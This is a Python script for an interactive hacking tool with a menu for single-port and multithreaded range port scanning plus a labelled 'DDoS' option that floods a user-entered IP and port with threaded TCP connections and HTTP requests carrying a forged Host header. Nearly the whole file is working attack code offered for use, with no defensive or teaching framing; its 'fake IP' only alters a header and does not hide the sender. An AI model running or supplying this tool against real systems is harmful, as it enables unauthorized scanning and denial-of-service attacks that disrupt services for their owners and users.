import socket
import threading
from queue import Queue
import time

# Parameters to Configure:
fake_ip = "15.15.15.15"  # Fake IP address for DDoS attack
evil_packets = 50         # Number of packets to send in DDoS attack
ip = ""


def fake_ip_set():
    while True:
        global fake_ip
        fake_ip = input("Enter Fake IP for DDoS: \n")
        print(fake_ip, " Set!")
        option = input(" (1) Accept\n (2) Decline\n")
        if option == "1":
            break
        else:
            continue


def single_scan():
    while True:
        print("----SINGLE SCAN----")
        _ip = input("Enter IP: ")
        port = int(input("Enter port: "))
        # Socket open
        tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcpSocket.settimeout(1)
        # Socket Connection returns number for connection status. 0-Successful
        connection = tcpSocket.connect_ex((_ip, port))
        # If connected successfully return 0 otherwise no connection was established.
        if connection == 0:
            print("\nPort ", port, " open")
        else:
            print("\nPort ", port, " closed.")
        # Menu: Scan again or EXIT
        while True:
            option = int(input("\n\n(1) Scan again.\n(2) EXIT\n"))
            if option == 1:
                break
            elif option == 2:
                return
            else:
                pass


# Ranged scan - port range
def range_scan():
    queue = Queue()
    open_ports = []

    def port_scan(_p):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, _p))
            return True
        except:
            return False

    def worker():
        while not queue.empty():
            port = queue.get()
            if port_scan(port):
                print("\nPort {} is open \n".format(port))
                open_ports.append(port)
            else:
                pass
            #    print("Port {} is closed".format(port))

    def scanner():
        thread_list = []

        for t in range(1000):
            thread = threading.Thread(target=worker)
            thread_list.append(thread)
        for thread in thread_list:
            thread.start()
        for thread in thread_list:
            thread.join()

        print("---------------------------------------------"
              "\nList of OPEN PORTS: ", *open_ports, sep="\n")
        while True:
            option = int(input("---------------------------------------------"
                               "\n(1) Scan again.\n(2) EXIT\n"))
            if option == 1:
                range_scan()
            elif option == 2:
                break
            else:
                pass

    global ip
    print("----RANGE SCAN----")
    ip = input("Enter IP: ")
    start_port = int(input("Enter Start PORT: "))
    end_port = int(input("Enter End PORT: "))
    for i in range(start_port, end_port):
        queue.put(i)
    scanner()


# Denial of Service attack on specific port
def ddos():
    def denial(_ip, _port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((_ip, _port))
            s.sendto(("GET /" + _ip + " HTTP/1.1\r\n").encode("ascii"), (_ip, _port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (_ip, _port))
            s.close()
            print("Sending Evil Packets!!!")
        except ConnectionRefusedError:
            print("Unreachable")
    while True:
        print("----DDoS----")
        list_t = []
        _ip = input("Enter IP: ")
        port = int(input("Enter port: "))
        # Send in multithreading
        for i in range(evil_packets):
            thread = threading.Thread(target=denial, args=(_ip, port))
            list_t.append(thread)
            thread.start()
        for i in list_t:
            i.join()
        option = int(input("\n(1) Attack again.\n(2) EXIT\n"))
        if option == 1:
            ddos()
        elif option == 2:
            return
        else:
            pass


# Beginning of the program / Main Menu
while True:
    print("\n"*100,
          "\n-----------------------------------\n"
          "        MAIN MENU              \n"
          "Choose from options below:")
    print("\n (1) Single Scan"
          "\n (2) Range Scan"
          "\n (3) DDoS"
          "\n\n (4) Set Fake IP (Header)"
          "\n (5) EXIT"
          "\n-----------------------------------\n")
    choice = input("")
    if choice == "1":
        single_scan()
    elif choice == "2":
        range_scan()
    elif choice == "3":
        ddos()
    elif choice == "4":
        fake_ip_set()
    elif choice == "5":
        exit()
    else:
        pass
